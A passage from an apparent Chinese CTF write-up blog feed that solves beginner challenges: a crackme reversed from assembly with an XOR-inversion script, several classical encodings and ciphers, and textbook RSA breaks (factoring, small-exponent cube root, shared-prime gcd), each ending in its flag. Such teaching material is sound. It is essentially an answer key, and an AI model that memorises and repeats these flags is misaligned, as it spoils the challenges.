class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000401550 push rbp </span><br><span class="line">.text:0000000000401551 mov rbp, rsp </span><br><span class="line">.text:0000000000401554 sub rsp, 90h </span><br><span class="line">.text:000000000040155B call __main</span><br><span class="line">#对应伪代码</span><br><span class="line">int main() &#123; </span><br><span class="line">// 保存旧的栈帧指针，设置新的栈帧，为局部变量分配空间 </span><br><span class="line">// push rbp; mov rbp, rsp; sub rsp, 90h </span><br><span class="line">// 调用初始化函数（可能是C标准库的初始化） </span><br><span class="line">__main();</span><br><span class="line"></span><br><span class="line">.text:0000000000401560 lea rcx, Buffer ;&quot;input your flag:&quot; </span><br><span class="line">.text:0000000000401567 call puts</span><br><span class="line">#对应伪代码</span><br><span class="line">puts(&quot;input your flag:&quot;);</span><br><span class="line"></span><br><span class="line">.text:000000000040156C lea rax, [rbp+Str] .text:0000000000401570 mov rdx, rax .text:0000000000401573 lea rcx, Format ; &quot;%s&quot; .text:000000000040157A call scanf</span><br><span class="line">#对应伪代码</span><br><span class="line">// 读取用户输入到局部变量Str中 </span><br><span class="line">char Str[/* 大小取决于栈空间分配 */]; </span><br><span class="line">scanf(&quot;%s&quot;, Str);</span><br><span class="line"></span><br><span class="line">.text:000000000040157F lea rax, [rbp+Str] .text:0000000000401583 mov rcx, rax ; Str .text:0000000000401586 call strlen .text:000000000040158B cmp rax, 23h ; &#x27;#&#x27; .text:000000000040158F jz short loc_40159B .text:0000000000401591 mov eax, 0 .text:0000000000401596 jmp loc_40162B</span><br><span class="line">#对应伪代码</span><br><span class="line">// 检查输入长度是否为35(0x23) </span><br><span class="line">if (strlen(Str) != 35) &#123; </span><br><span class="line">return 0; // 长度不符则退出 </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.text:000000000040159B mov [rbp+var_4], 0 ; i = 0 .text:00000000004015A2 loc_4015A2: ; 循环开始 .text:00000000004015A2 cmp [rbp+var_4], 22h ; i &lt;= 34? </span><br><span class="line">.text:00000000004015A6 jg short loc_40161A .text:00000000004015A8 mov eax, [rbp+var_4] .text:00000000004015AB cdqe ; 符号扩展 .text:00000000004015AD movzx eax, [rbp+rax+Str] ; 取Str[i] </span><br><span class="line">.text:00000000004015B2 xor eax, 52h ; Str[i] ^= 0x52 #xor异或运算</span><br><span class="line">.text:00000000004015B5 mov edx, eax .text:00000000004015B7 mov eax, [rbp+var_4] .text:00000000004015BA cdqe .text:00000000004015BC mov [rbp+rax+Str], dl ; 写回Str[i] </span><br><span class="line">.text:00000000004015C0 mov eax, [rbp+var_4] .text:00000000004015C3 cdqe .text:00000000004015C5 movzx eax, [rbp+rax+Str] .text:00000000004015CA add eax, 5 ; Str[i] += 5 .text:00000000004015CD mov edx, eax .text:00000000004015CF mov eax, [rbp+var_4] .text:00000000004015D2 cdqe .text:00000000004015D4 mov [rbp+rax+Str], dl ; 写回Str[i]</span><br><span class="line">#对应伪代码</span><br><span class="line">// 初始化循环变量i=0 </span><br><span class="line">int i = 0; </span><br><span class="line">// 循环处理每个字符，直到i &gt; 34 (0x22) </span><br><span class="line">while (i &lt;= 34) &#123; </span><br><span class="line">// 对Str[i]进行变换：先异或0x52 </span><br><span class="line">Str[i] ^= 0x52; </span><br><span class="line">Str[i] += 5;// 再加上5</span><br><span class="line"></span><br><span class="line">.text:00000000004015D8 mov eax, [rbp+var_4] .text:00000000004015DB cdqe .text:00000000004015DD movzx eax, [rbp+rax+Str] .text:00000000004015E2 movsx eax, al ; 符号扩展 .text:00000000004015E5 mov edx, [rbp+var_4] .text:00000000004015E8 movsxd rdx, edx .text:00000000004015EB lea rcx, ds:0[rdx*4] ; hint[i*4]? </span><br><span class="line">.text:00000000004015F3 lea rdx, res ; 可能是hint数组基址 </span><br><span class="line">.text:00000000004015FA mov edx, [rcx+rdx] ; 取hint[i] </span><br><span class="line">.text:00000000004015FD cmp eax, edx ; 比较Str[i]与hint[i] </span><br><span class="line">.text:00000000004015FF jz short loc_401614 ; 相等则继续 </span><br><span class="line">.text:0000000000401601 lea rcx, aWrong ; &quot;Wrong!&quot; .text:0000000000401608 call puts .text:000000000040160D mov eax, 0 .text:0000000000401612 jmp short loc_40162B</span><br><span class="line">#对应伪代码</span><br><span class="line">// 检查变换后的Str[i]是否等于hint[i] </span><br><span class="line">if (Str[i] != hint[i]) &#123; </span><br><span class="line">puts(&quot;Wrong!&quot;); // 不相等则输出错误信息 </span><br><span class="line">return 0; // 并退出程序 </span><br><span class="line">&#125; </span><br><span class="line">i++; // 循环变量递增 </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.text:000000000040161A loc_40161A: ; 循环结束后执行 .text:000000000040161A lea rcx, aGood ; &quot;Good!&quot; .text:0000000000401621 call puts .text:0000000000401626 mov eax, 0</span><br><span class="line">#对应伪代码</span><br><span class="line">// 所有字符验证通过，输出&quot;Good!&quot; </span><br><span class="line">puts(&quot;Good!&quot;); </span><br><span class="line">return 0;</span><br><span class="line"></span><br><span class="line">.text:000000000040162B loc_40162B: .text:000000000040162B add rsp, 90h ; 释放局部变量空间 </span><br><span class="line">.text:0000000000401632 pop rbp ; 恢复旧的栈帧指针 .text:0000000000401633 retn ; 返回</span><br><span class="line">#对应伪代码</span><br><span class="line">// 函数结束，栈帧恢复 </span><br><span class="line">&#125; // 对应main函数结束</span><br></pre></td></tr></table></figure><p><strong>总结</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">char Str[/* 长度动态 */]; </span><br><span class="line">printf(&quot;input your flag:&quot;); // puts(&quot;input your flag:&quot;) </span><br><span class="line">scanf(&quot;%s&quot;, Str); // 读取用户输入到 Str </span><br><span class="line">if (strlen(Str) != 0x23) &#123; // 0x23 = 35，检查输入长度是否为 35 </span><br><span class="line">printf(&quot;Wrong!&quot;); // 长度不对直接报错 </span><br><span class="line">return 0; </span><br><span class="line">&#125;</span><br><span class="line">// 第一步：异或 0x52 </span><br><span class="line">Str[i] ^= 0x52; </span><br><span class="line">// 第二步：加 5 </span><br><span class="line">Str[i] += 5; </span><br><span class="line">// 第三步：与 hint 数组对比 </span><br><span class="line">if (Str[i] != hint[i]) &#123; </span><br><span class="line">printf(&quot;Wrong!&quot;); </span><br><span class="line">return 0; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="解题思路：逆向推导-Flag"><a href="#解题思路：逆向推导-Flag" class="headerlink" title="解题思路：逆向推导 Flag"></a>解题思路：逆向推导 Flag</h3><p>已知 <code>hint</code> 数组，需<strong>反向推导原始输入 <code>Str</code></strong>（即 Flag ）。<br>逆向推导原始 <code>Str[i]</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Str[i] = (hint[i] - 5) ^ 0x52  </span><br></pre></td></tr></table></figure><p><strong>编写逆向计算脚本</strong><br>用 Python 反向推导每个 <code>Str[i]</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">hint = [<span class="number">0x21</span>,<span class="number">0x6</span>,<span class="number">0x6</span>,<span class="number">0x16</span>,<span class="number">0xb</span>,<span class="number">0x19</span>,<span class="number">0x2e</span>,<span class="number">0x65</span>,<span class="number">0x35</span>,<span class="number">0x6a</span>,<span class="number">0x6f</span>,<span class="number">0x38</span>,<span class="number">0x36</span>,<span class="number">0x84</span>,<span class="number">0x70</span>,<span class="number">0x3b</span>,<span class="number">0x39</span>,<span class="number">0x65</span>,<span class="number">0x38</span>,<span class="number">0x35</span>,<span class="number">0x84</span>,<span class="number">0x6f</span>,<span class="number">0x36</span>,<span class="number">0x3c</span>,<span class="number">0x6a</span>,<span class="number">0x38</span>,<span class="number">0x68</span>,<span class="number">0x84</span>,<span class="number">0x66</span>,<span class="number">0x70</span>,<span class="number">0x3b</span>,<span class="number">0x38</span>,<span class="number">0x6a</span>,<span class="number">0x36</span>,<span class="number">0x34</span>]</span><br><span class="line">flag = []</span><br><span class="line"><span class="keyword">for</span> h <span class="keyword">in</span> hint:</span><br><span class="line">    temp = (h - <span class="number">5</span>) ^ <span class="number">0x52</span> <span class="comment">#逆向计算:先减5,再异或 0x52</span></span><br><span class="line">    flag.append(<span class="built_in">chr</span>(temp))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(flag))<span class="comment"># 拼接字符得到 Flag</span></span><br></pre></td></tr></table></figure><p>NSSCTF{2b78ac-9df2ab-8ce7a1-39da7c}</p>]]></content>
      
      
      <categories>
          
          <category> REVERSE </category>
          
          <category> 汇编 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ascii</title>
      <link href="/2025/06/4ae6af308ca1.html"/>
      <url>/2025/06/4ae6af308ca1.html</url>
      
        <content type="html"><![CDATA[<p>54 5a 43 46 6c 61 67 7b 48 65 6c 6c 6f 5f 41 53 43 49 49 7d<br><img src="/images/%7BD49E689A-C316-4E38-8BC3-7F6155521A10%7D.png"></p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
          <category> 常见编码 </category>
          
          <category> ASCII编码 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Quoted-printable</title>
      <link href="/2025/06/898b6c6144d9.html"/>
      <url>/2025/06/898b6c6144d9.html</url>
      
        <content type="html"><![CDATA[<p>&#x3D;E9&#x3D;82&#x3D;A3&#x3D;E4&#x3D;BD&#x3D;A0&#x3D;E4&#x3D;B9&#x3D;9F&#x3D;E5&#x3D;BE&#x3D;88&#x3D;E6&#x3D;A3&#x3D;92&#x3D;E5&#x3D;93&#x3D;A6<br>原理是没有等号就把英文、数字等原样输出，等号加两个十六进制数代表一个非 Ascii 码范围的字符（如汉字）或特殊字符。<br><img src="/images/Pastedimage20250601184509.png"></p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
          <category> 常见编码 </category>
          
          <category> Quoted-printable编码 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Tap tap</title>
      <link href="/2025/06/d953a328927b.html"/>
      <url>/2025/06/d953a328927b.html</url>
      
        <content type="html"><![CDATA[<p>小明最近在追《疑犯追凶》，在第二季结尾的时候出现了这么一张图片，他却没看懂啥意思，你能帮帮他吗 flag格式为TZCFlag{xxxx},xxxx全大写<br><img src="/images/tapcode.webp"></p><ul><li><code>44</code> 对应字母 <code>T</code> 。</li><li><code>42</code> 对应字母 <code>R</code> 。</li><li><code>11</code> 对应字母 <code>A</code> 。</li><li><code>24</code> 对应字母 <code>I</code> 。</li><li><code>33</code> 对应字母 <code>N</code> 。</li><li><code>43</code> 对应字母 <code>S</code> 。</li><li><code>44</code> 对应字母 <code>T</code> 。</li><li><code>33</code> 对应字母 <code>N</code> 。<br>TZCFlag{TRAINSTN}</li></ul>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
          <category> 常见编码 </category>
          
          <category> 敲击码(Tap code) </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>原理</title>
      <link href="/2025/06/55b5fee0b6cc.html"/>
      <url>/2025/06/55b5fee0b6cc.html</url>
      
        <content type="html"><![CDATA[<p>&#x3D;&#x3D;<strong>加密</strong>&#x3D;&#x3D;<br>当加密为两组时，把将要传递的信息中的字母交替排成上下两行。</p><p>再将下面一行字母排在上面一行的后边，从而形成一段密码。</p><p>例如：加密明文。<br><strong><em>ALL LIFE IS A GAME OF LUCK</em></strong></p><p>当加密为两组时，将句子从上往下交替写成两行，也就是第一 三 五等奇数个字母作为第一组，第二四六作为第二组。</p><p><strong><em>ALIESGMOLC</em></strong></p><p><strong><em>LLFIAAEFUK</em></strong></p><p>再将第一组放在第二组前</p><p><em><strong>ALIESGMOLCLLFIAAEFUK</strong></em></p><p>加密完成。</p><p>&#x3D;&#x3D;<strong>解 密</strong>&#x3D;&#x3D;<br>第一步将密文按组分开。当密文字母个数为奇数个时，第一组比第二组多一个。<br>第二步自上向下读出。 </p><p>举例：<br>密文：<em><strong>TMKECDYONOAEAHACUT</strong></em></p><p>密文字母个数为18，第一组9个字母，第二组9个字母。</p><p><em><strong>TMKECDYON</strong></em><br><em><strong>OAEAHACUT</strong></em></p><p>自上向下读出：<em><strong>TOMAKEEACHDAYCOUNT</strong></em></p><p>得明文：<em><strong>TO MAKE EACH DAY COUNT</strong></em></p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
          <category> 换位密码 </category>
          
          <category> 栅栏密码 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>篱笆墙的影子</title>
      <link href="/2025/06/d3e8b0c9d849.html"/>
      <url>/2025/06/d3e8b0c9d849.html</url>
      
        <content type="html"><![CDATA[<p>felhaagv{ewtehtehfilnakgw}</p><p>看这个felhaag，flag在里面很明显，最后一位是} 。<br>分成两组<br>f l a g { w e t h i n k w<br>e h a v e t h e f l a g }<br>这就是加密<br>flag{wethinkwehavetheflag}<br><a href="https://www.qqxiuzi.cn/bianma/zhalanmima.php">https://www.qqxiuzi.cn/bianma/zhalanmima.php</a>            [在线栅栏加解密]</p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
          <category> 换位密码 </category>
          
          <category> 栅栏密码 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>原理</title>
      <link href="/2025/06/54ed00852af2.html"/>
      <url>/2025/06/54ed00852af2.html</url>
      
        <content type="html"><![CDATA[<h3 id="编码规则"><a href="#编码规则" class="headerlink" title="编码规则"></a>编码规则</h3><p>将字母表排列成 5×5 的矩阵（C和K共用一格 ） ，如下：<br>|<img src="/images/Pastedimage20250603134130.png"></p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
          <category> 常见编码 </category>
          
          <category> 敲击码(Tap code) </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>c,n,e</title>
      <link href="/2025/06/4c96d1aad14e.html"/>
      <url>/2025/06/4c96d1aad14e.html</url>
      
        <content type="html"><![CDATA[<p>c &#x3D; 566134289175001073338056659296498386641704313655869270504728356324933522811329068806508523532229682163525391220524802986785979422224911403071360548998101883993096018419857810663495564026562659363871989824162135535273717970285889221585901801835578256566036552604952749911282130835836581634840314211017046826426109774890418389574576128514071616464686335314358612894449871297012320880991577385456512998134643750537355527145843861005150574206728763965567156607610158050662833497593328881837388826744959143787862030176066778562928676173698618553745217799573433348833221151549888811871451808452955305602107063553259177528973779863154453333102822257682773411954333494475389886363107483562321532979964779714092494561759919711378961571336972685333275022586113138145007123147423870377012703192994633879942428704057951403358824692549839968488524015173505870905889600039037750913144895609595459004953371070240801671011997833228707676492818822464352241156584093362459311507045539329339058073049976087255850541570728786975634641284864343466456814506387776441995199436103111145990444660701184107235574238419914669387830626551319768539563036924648893943101966787768445626547186646731973307521638141189845168175085035920200073130311681615711143905321<br>n &#x3D; 966808932627497190635859236054960349099463975227350564265384373280336699853387254070662881265937565163000758606154308757944030571837175048514574473061401566330836334647176655282619268592560172726526643074499534129878217409046045533656897050117438496357231575999185527675071002803951800635220029015932007465117818739948903750200830856115668691007706836952244842719419452946259275251773298338162389930518838272704908887016474007051397194588396039111216708866214614779627566959335170676055025850932631053641576566165694121420546081043285806783239296799795655191121966377590175780618944910532816988143056757054052679968538901460893571204904394975714081055455240523895653305315517745729334114549756695334171142876080477105070409544777981602152762154610738540163796164295222810243309051503090866674634440359226192530724635477051576515179864461174911975667162597286769079380660782647952944808596310476973939156187472076952935728249061137481887589103973591082872988641958270285169650803792395556363304056290077801453980822097583574309682935697260204862756923865556397686696854239564541407185709940107806536773160263764483443859425726953142964148216209968437587044617613518058779287167853349364533716458676066734216877566181514607693882375533<br>e &#x3D; 65537</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">from sympy import factorint</span><br><span class="line">from sympy import mod_inverse</span><br><span class="line">n = 966808932627497190635859236054960349099463975227350564265384373280336699853387254070662881265937565163000758606154308757944030571837175048514574473061401566330836334647176655282619268592560172726526643074499534129878217409046045533656897050117438496357231575999185527675071002803951800635220029015932007465117818739948903750200830856115668691007706836952244842719419452946259275251773298338162389930518838272704908887016474007051397194588396039111216708866214614779627566959335170676055025850932631053641576566165694121420546081043285806783239296799795655191121966377590175780618944910532816988143056757054052679968538901460893571204904394975714081055455240523895653305315517745729334114549756695334171142876080477105070409544777981602152762154610738540163796164295222810243309051503090866674634440359226192530724635477051576515179864461174911975667162597286769079380660782647952944808596310476973939156187472076952935728249061137481887589103973591082872988641958270285169650803792395556363304056290077801453980822097583574309682935697260204862756923865556397686696854239564541407185709940107806536773160263764483443859425726953142964148216209968437587044617613518058779287167853349364533716458676066734216877566181514607693882375533</span><br><span class="line"></span><br><span class="line"># 分解 n</span><br><span class="line">factors = factorint(n)</span><br><span class="line">p, q = factors.keys()</span><br><span class="line">phi_n = (p - 1) * (q - 1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c = 566134289175001073338056659296498386641704313655869270504728356324933522811329068806508523532229682163525391220524802986785979422224911403071360548998101883993096018419857810663495564026562659363871989824162135535273717970285889221585901801835578256566036552604952749911282130835836581634840314211017046826426109774890418389574576128514071616464686335314358612894449871297012320880991577385456512998134643750537355527145843861005150574206728763965567156607610158050662833497593328881837388826744959143787862030176066778562928676173698618553745217799573433348833221151549888811871451808452955305602107063553259177528973779863154453333102822257682773411954333494475389886363107483562321532979964779714092494561759919711378961571336972685333275022586113138145007123147423870377012703192994633879942428704057951403358824692549839968488524015173505870905889600039037750913144895609595459004953371070240801671011997833228707676492818822464352241156584093362459311507045539329339058073049976087255850541570728786975634641284864343466456814506387776441995199436103111145990444660701184107235574238419914669387830626551319768539563036924648893943101966787768445626547186646731973307521638141189845168175085035920200073130311681615711143905321</span><br><span class="line">e = 65537</span><br><span class="line">d = mod_inverse(e, phi_n)</span><br><span class="line">m = pow(c, d, n) </span><br><span class="line">def num_to_ascii(m):</span><br><span class="line">    m_bytes = m.to_bytes((m.bit_length() + 7) // 8, byteorder=&#x27;big&#x27;)</span><br><span class="line">    return m_bytes.decode(&#x27;utf-8&#x27;)</span><br><span class="line"></span><br><span class="line">flag = num_to_ascii(m)</span><br><span class="line">print(f&quot;flag = &#123;flag&#125;&quot;)</span><br></pre></td></tr></table></figure><p> flag&#x3D;TZCFlag{factor_is_so_easy}<br><img src="/images/Pastedimage20250603143451.png">）</p><hr><p>n &#x3D; 0x52d483c27cd806550fbe0e37a61af2e7cf5e0efb723dfc81174c918a27627779b21fa3c851e9e94188eaee3d5cd6f752406a43fbecb53e80836ff1e185d3ccd7782ea846c2e91a7b0808986666e0bdadbfb7bdd65670a589a4d2478e9adcafe97c6ee23614bcb2ecc23580f4d2e3cc1ecfec25c50da4bc754dde6c8bfd8d1fc16956c74d8e9196046a01dc9f3024e11461c294f29d7421140732fedacac97b8fe50999117d27943c953f18c4ff4f8c258d839764078d4b6ef6e8591e0ff5563b31a39e6374d0d41c8c46921c25e5904a817ef8e39e5c9b71225a83269693e0b7e3218fc5e5a1e8412ba16e588b3d6ac536dce39fcdfce81eec79979ea6872793<br>e &#x3D; 3  <strong>&#x3D;&#x3D;当e较小时则可直接通过开立方根得到明文&#x3D;&#x3D;</strong><br>c &#x3D; 6021062141588965841587167293</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">n = 0x52d483c27cd806550fbe0e37a61af2e7cf5e0efb723dfc81174c918a27627779b21fa3c851e9e94188eaee3d5cd6f752406a43fbecb53e80836ff1e185d3ccd7782ea846c2e91a7b0808986666e0bdadbfb7bdd65670a589a4d2478e9adcafe97c6ee23614bcb2ecc23580f4d2e3cc1ecfec25c50da4bc754dde6c8bfd8d1fc16956c74d8e9196046a01dc9f3024e11461c294f29d7421140732fedacac97b8fe50999117d27943c953f18c4ff4f8c258d839764078d4b6ef6e8591e0ff5563b31a39e6374d0d41c8c46921c25e5904a817ef8e39e5c9b71225a83269693e0b7e3218fc5e5a1e8412ba16e588b3d6ac536dce39fcdfce81eec79979ea6872793</span><br><span class="line">e = 3</span><br><span class="line">c = 6021062141588965841587167293</span><br><span class="line"></span><br><span class="line"># 计算立方根</span><br><span class="line">m = round(c ** (1/3))</span><br><span class="line">if pow(m, 3) == c:</span><br><span class="line">    print(&quot;明文整数:&quot;, m)</span><br><span class="line">    flag = m.to_bytes((m.bit_length() + 7) // 8, byteorder=&#x27;big&#x27;).decode(&#x27;ascii&#x27;)</span><br><span class="line">    print(&quot;Flag:&quot;, flag)</span><br><span class="line">else:</span><br><span class="line">    print(&quot;无法通过低指数攻击破解&quot;)</span><br></pre></td></tr></table></figure><p>明文整数: 1819244357<br>Flag: lowE<br>TZCFlag{lowE}</p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
          <category> 非对称加密（Asymmetric Cryptography） </category>
          
          <category> RSA </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>n1,n2,e,c共享素因数</title>
      <link href="/2025/06/6f67f52f7ab4.html"/>
      <url>/2025/06/6f67f52f7ab4.html</url>
      
        <content type="html"><![CDATA[<p>n1&#x3D;9051013965404084482870087864821455535159008696042953021965631089095795348830954383127323853272528967729311045179605407693592665683311660581204886571146327720288455874927281128121117323579691204792399913106627543274457036172455814805715668293705603675386878220947722186914112990452722174363713630297685159669328951520891938403452797650685849523658191947411429068829734053745180460758604283051344339641429819373112365211739216160420494167071996438506850526168389386850499796102003625404245645796271690310748804327<br>n2&#x3D;13225948396179603816062046418717214792668512413625091569997524364243995991961018894150059207824093837420451375240550310050209398964506318518991620142575926623780411532257230701985821629425722030608722035570690474171259238153947095310303522831971664666067542649034461621725656234869005501293423975184701929729170077280251436216167293058560030089006140224375425679571181787206982712477261432579537981278055755344573767076951793312062480275004564657590263719816033564139497109942073701755011873153205366238585665743<br>e &#x3D; 65537<br>c &#x3D; 268065307799668245100155583656026011160002952385077142247208270849202533959057073328593124609246618255434974771312005129546891196910224298782988830299931466177092252318898389606108682805827112298601665236639013976557584096409090034724959181393317682380243407722802135226000120577664046248111234520151522261820924236477640240403636122092626752359753454045971441763375027128396562369686719452592987407716592442173485676980456821015690717339269128488747739318128952772386390939524794974383676486458446499596610588</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">from math import gcd </span><br><span class="line">from sympy import mod_inverse </span><br><span class="line">n1 = 9051013965404084482870087864821455535159008696042953021965631089095795348830954383127323853272528967729311045179605407693592665683311660581204886571146327720288455874927281128121117323579691204792399913106627543274457036172455814805715668293705603675386878220947722186914112990452722174363713630297685159669328951520891938403452797650685849523658191947411429068829734053745180460758604283051344339641429819373112365211739216160420494167071996438506850526168389386850499796102003625404245645796271690310748804327 </span><br><span class="line">n2 = 13225948396179603816062046418717214792668512413625091569997524364243995991961018894150059207824093837420451375240550310050209398964506318518991620142575926623780411532257230701985821629425722030608722035570690474171259238153947095310303522831971664666067542649034461621725656234869005501293423975184701929729170077280251436216167293058560030089006140224375425679571181787206982712477261432579537981278055755344573767076951793312062480275004564657590263719816033564139497109942073701755011873153205366238585665743</span><br><span class="line">c = 268065307799668245100155583656026011160002952385077142247208270849202533959057073328593124609246618255434974771312005129546891196910224298782988830299931466177092252318898389606108682805827112298601665236639013976557584096409090034724959181393317682380243407722802135226000120577664046248111234520151522261820924236477640240403636122092626752359753454045971441763375027128396562369686719452592987407716592442173485676980456821015690717339269128488747739318128952772386390939524794974383676486458446499596610588 </span><br><span class="line"></span><br><span class="line">e = 65537 </span><br><span class="line"></span><br><span class="line">p = gcd(n1, n2) # 计算gcd(n1, n2) </span><br><span class="line"></span><br><span class="line">if p &gt; 1: </span><br><span class="line">print(f&quot;发现共享素因数 p = &#123;p&#125;&quot;)</span><br><span class="line"></span><br><span class="line"># 计算另一个素因数 </span><br><span class="line">q1 = n1 // p </span><br><span class="line">q2 = n2 // p </span><br><span class="line"></span><br><span class="line"># 计算φ(n) </span><br><span class="line">phi_n1 = (p - 1) * (q1 - 1) </span><br><span class="line">phi_n2 = (p - 1) * (q2 - 1) </span><br><span class="line"></span><br><span class="line"># 计算私钥d </span><br><span class="line">d1 = mod_inverse(e, phi_n1) </span><br><span class="line">d2 = mod_inverse(e, phi_n2) </span><br><span class="line"></span><br><span class="line"># 解密 </span><br><span class="line">m1 = pow(c, d1, n1) </span><br><span class="line">m2 = pow(c, d2, n2) </span><br><span class="line"></span><br><span class="line"># 转换为ASCII </span><br><span class="line">def num_to_ascii(m):</span><br><span class="line">m_bytes = m.to_bytes((m.bit_length() + 7) // 8, byteorder=&#x27;big&#x27;) </span><br><span class="line">return   m_bytes.decode(&#x27;utf-8&#x27;, errors=&#x27;ignore&#x27;) </span><br><span class="line">flag1 = num_to_ascii(m1)</span><br><span class="line">flag2 = num_to_ascii(m2) </span><br><span class="line">print(f&quot;flag1 = &#123;flag1&#125;&quot;) </span><br><span class="line">print(f&quot;flag2 = &#123;flag2&#125;&quot;)</span><br><span class="line">else: </span><br><span class="line">print(&quot;未发现共享素因数，需要其他方法分解模数&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>发现共享素因数 p &#x3D; 1564859779720039565508870182569324208117555667917997801104862601098933699462849007879184203051278194180664616470669559575370868384820368930104560074538872199213236203822337186927275879139590248731148622362880471439310489228147093224418374555428793546002109</p><p>flag1 &#x3D; TZCFlag{I_love_rsa}</p><p>flag2 &#x3D; SN96LdJnS}%?;Z#:n,zzpQ4&#96;9Jv#a?MZ”HZHj</p><p>q审_Pd,&#x3D;R&lt;w^y(iGma,84&gt;uԌUE!t&#x3D;턢u’Q9ݩ}g<br>2.H*~Sm:!eDA</p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
          <category> 非对称加密（Asymmetric Cryptography） </category>
          
          <category> RSA </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>p,q,e</title>
      <link href="/2025/06/ca93d03320bb.html"/>
      <url>/2025/06/ca93d03320bb.html</url>
      
        <content type="html"><![CDATA[<p>在一次RSA密钥对生成中，假设p&#x3D;473398607161，q&#x3D;4511491，e&#x3D;17<br>求解出d作为flga提交</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">p=473398607161</span><br><span class="line">q=4511491</span><br><span class="line">e=17</span><br><span class="line">z=(p-1)*(q-1) #欧拉函数</span><br><span class="line">d = pow(e, -1, z) #(e * d) % z == 1 </span><br><span class="line">#m = pow(c, d, n)</span><br><span class="line">print(d)</span><br></pre></td></tr></table></figure><p>or</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">p = 473398607161 </span><br><span class="line">q = 4511491 </span><br><span class="line">e = 17 </span><br><span class="line">z = (p - 1) * (q - 1) </span><br><span class="line">d = gmpy2.invert(e, z) # e*d mod 